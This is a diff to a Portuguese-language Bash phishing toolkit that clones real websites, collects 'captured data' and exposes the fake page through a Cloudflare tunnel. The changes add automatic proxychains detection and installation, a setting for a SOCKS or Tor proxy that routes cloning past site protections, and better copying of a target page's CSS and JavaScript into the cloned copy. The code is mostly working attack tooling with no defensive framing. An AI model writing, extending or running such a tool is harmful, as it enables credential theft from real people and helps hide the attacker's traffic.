@@ -6,7 +6,7 @@
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
-VERSAO="49"
+VERSAO="58"
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
@@ -41,6 +41,25 @@ get_my_ip() {
     [ -z "$ip" ] && ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
     [ -z "$ip" ] && ip="127.0.0.1"
     echo "$ip"
+}
+
+# =============================================
+# DETECTAR PROXY
+# =============================================
+detect_proxy() {
+    local pc_conf=""
+    [ -f "$HOME/.proxychains/proxychains.conf" ] && pc_conf="$HOME/.proxychains/proxychains.conf"
+    [ -z "$pc_conf" ] && [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ] && pc_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
+    if [ -n "$pc_conf" ] && [ -s "$pc_conf" ] && command -v proxychains4 &>/dev/null; then
+        # Verificar se tem proxy configurado (não vazio)
+        local has_proxy=$(grep -vE '^\s*#|^\s*$' "$pc_conf" | grep -c "socks\|http\|socks4\|socks5" 2>/dev/null || echo "0")
+        if [ "$has_proxy" -gt 0 ]; then
+            echo "$pc_conf"
+            return 0
+        fi
+    fi
+    echo ""
+    return 1
 }
 
 # =============================================
@@ -111,18 +130,24 @@ clone_site() {
     local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
 
     if [ "$use_proxy" = "y" ]; then
-        local pc_conf=""
-        [ -f "$HOME/.proxychains/proxychains.conf" ] && pc_conf="$HOME/.proxychains/proxychains.conf"
-        [ -z "$pc_conf" ] && [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ] && pc_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
-        if [ -n "$pc_conf" ] && command -v proxychains4 &>/dev/null; then
+        local pc_conf=$(detect_proxy)
+        if [ -n "$pc_conf" ]; then
             curl_cmd="proxychains4 -f $pc_conf curl"
             echo -e "${GREEN}[Proxy ativo]${NC}"
         else
-            echo -e "${YELLOW}[Proxy indisponivel]${NC}"
-            use_proxy=""
+            echo -e "${YELLOW}[Proxy indisponivel - instalando proxychains]${NC}"
+            pkg install -y proxychains-ng 2>/dev/null
+            pc_conf=$(detect_proxy)
+            if [ -n "$pc_conf" ]; then
+                curl_cmd="proxychains4 -f $pc_conf curl"
+                echo -e "${GREEN}[Proxy ativo]${NC}"
+            else
+                echo -e "${RED}[ERRO] Proxy nao disponivel${NC}"
+                use_proxy=""
+            fi
         fi
     else
-        echo -e "${YELLOW}[Sem proxy${NC}"
+        echo -e "${YELLOW}[Sem proxy]${NC}"
     fi
 
     local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
@@ -156,7 +181,7 @@ clone_site() {
         $curl_cmd $curl_opts -w "\n%{http_code}" --compressed -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: gzip, deflate, br" -H "Cache-Control: no-cache" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1
 
         local http_code=$(tail -1 "$SCRIPT_DIR/curl.log" 2>/dev/null | grep -oE '^[0-9]{3}$' || echo "000")
-        sed -i '$ { /^[0-9]{3}$/d; }' "$SCRIPT_DIR/curl.log" 2>/dev/null
+        sed -i '/^[0-9]{3}$/d' "$SCRIPT_DIR/curl.log" 2>/dev/null
 
         html_size=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
 
@@ -1177,13 +1202,15 @@ do_paste_html() {
     local css_links=$(grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//')
     if [ -n "$css_links" ]; then
         echo -e "  ${YELLOW}Baixando CSS...${NC}"
-        echo "$css_links" | while read css_url; do
-            # Se for URL completa, baixa
-            echo "$css_url" | grep -q "^http" && curl -s -o "$SITE_DIR/styles.css" "$css_url" 2>/dev/null
-        done
-        # Substituir link pelo CSS local
-        sed -i 's|href="[^"]*\.css[^"]*"|href="styles.css"|g' "$SITE_DIR/index.html" 2>/dev/null
-        echo -e "  ${GREEN}CSS baixado!${NC}"
+        local css_count=0
+        while IFS= read -r css_url; do
+            [ -z "$css_url" ] && continue
+            echo "$css_url" | grep -q "^http" || css_url="https:$css_url"
+            curl -s -o "$SITE_DIR/css_${css_count}.css" "$css_url" 2>/dev/null
+            perl -i -pe "s|\Q${css_url}\E|css_${css_count}.css|g" "$SITE_DIR/index.html" 2>/dev/null
+            css_count=$((css_count + 1))
+        done <<< "$css_links"
+        echo -e "  ${GREEN}${css_count} CSS baixados!${NC}"
     fi
 
     # Baixar JS externo se existir
@@ -1191,16 +1218,14 @@ do_paste_html() {
     if [ -n "$js_links" ]; then
         echo -e "  ${YELLOW}Baixando JS...${NC}"
         local js_count=0
-        echo "$js_links" | while read js_url; do
-            echo "$js_url" | grep -q "^http" && curl -s -o "$SITE_DIR/script_${js_count}.js" "$js_url" 2>/dev/null && js_count=$((js_count + 1))
-        done
-        # Substituir src pelos JS locais
-        local idx=0
-        while grep -q 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null; do
-            sed -i "0,/src=\"[^\"]*\.js[^\"]*\"/s||src=\"script_${idx}.js\"|" "$SITE_DIR/index.html" 2>/dev/null
-            idx=$((idx + 1))
-        done
-        echo -e "  ${GREEN}JS baixado!${NC}"
+        while IFS= read -r js_url; do
+            [ -z "$js_url" ] && continue
+            echo "$js_url" | grep -q "^http" || js_url="https:$js_url"
+            curl -s -o "$SITE_DIR/js_${js_count}.js" "$js_url" 2>/dev/null
+            perl -i -pe "s|\Q${js_url}\E|js_${js_count}.js|g" "$SITE_DIR/index.html" 2>/dev/null
+            js_count=$((js_count + 1))
+        done <<< "$js_links"
+        echo -e "  ${GREEN}${js_count} JS baixados!${NC}"
     fi
 
     local html_size=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
@@ -1236,6 +1261,7 @@ do_config() {
     echo -e "${PURPLE}  ═══════════════════════════════════════${NC}"
     echo ""
     echo -e "  ${GREEN}[1] PROXY${NC}          Proxy sempre ligado nos clones"
+    echo -e "  ${CYAN}[1b] PROXY IP${NC}       Configurar IP:porta do proxy"
     echo -e "  ${CYAN}[2] COR BANNER${NC}      Cor do titulo (verde, cyan, vermelho...)"
     echo -e "  ${YELLOW}[3] TUNEL TOKEN${NC}    Token Cloudflare (se der erro 1101)"
     echo -e "  ${WHITE}[4] RESET${NC}          Restaurar padrao"
@@ -1255,6 +1281,16 @@ do_config() {
             else
                 echo "PROXY_ALWAYS=0" > "$SCRIPT_DIR/.config"
                 echo -e "  ${YELLOW}Proxy normal (pergunta)${NC}"
+            fi
+            ;;
+        1b)
+            echo -n "  Proxy (ex: socks5 127.0.0.1 9050): "
+            read PROXY_LINE
+            if [ -n "$PROXY_LINE" ]; then
+                mkdir -p "$HOME/.proxychains"
+                echo "[ProxyList]" > "$HOME/.proxychains/proxychains.conf"
+                echo "$PROXY_LINE" >> "$HOME/.proxychains/proxychains.conf"
+                echo -e "  ${GREEN}Proxy configurado!${NC}"
             fi
             ;;
         2)
@@ -1320,6 +1356,10 @@ while true; do
     echo ""
 
     # Menu com cores fortes (numeros, sem letras)
+    local proxy_status="${RED}OFF${NC}"
+    local pc_check=$(detect_proxy 2>/dev/null)
+    [ -n "$pc_check" ] && proxy_status="${GREEN}ON${NC}"
+    
     echo -e "  ${GREEN}[1] PHISH${NC}        Clonar site"
     echo -e "  ${CYAN}[2] CAPTURAS${NC}     Dados recebidos"
     echo -e "  ${YELLOW}[3] TUNEL${NC}        Link publico Cloudflare"
@@ -1332,6 +1372,7 @@ while true; do
     echo ""
     echo -e "  ${RED}[0] SAIR${NC}"
     echo ""
+    echo -e "  Proxy: ${proxy_status}  ${WHITE}🎣 v${VERSAO}${NC}"
     echo -e "  ${YELLOW}Escolha: ${NC}"
     read OP
 
@@ -1375,6 +1416,13 @@ while true; do
                 echo -e "  ${RED}⚠ Protecao detectada: ${scan_sec}${NC}"
                 echo -e "  ${YELLOW}  Site pode estar bloqueando acesso${NC}"
                 need_proxy="1"
+            fi
+
+            # Auto-ativar proxy se ja estiver configurado
+            local auto_proxy=$(detect_proxy 2>/dev/null)
+            if [ -n "$auto_proxy" ] && [ -f "$SCRIPT_DIR/.config" ]; then
+                source "$SCRIPT_DIR/.config" 2>/dev/null
+                [ "$PROXY_ALWAYS" = "1" ] && need_proxy="1"
             fi
 
             if [ "$need_proxy" = "1" ]; then
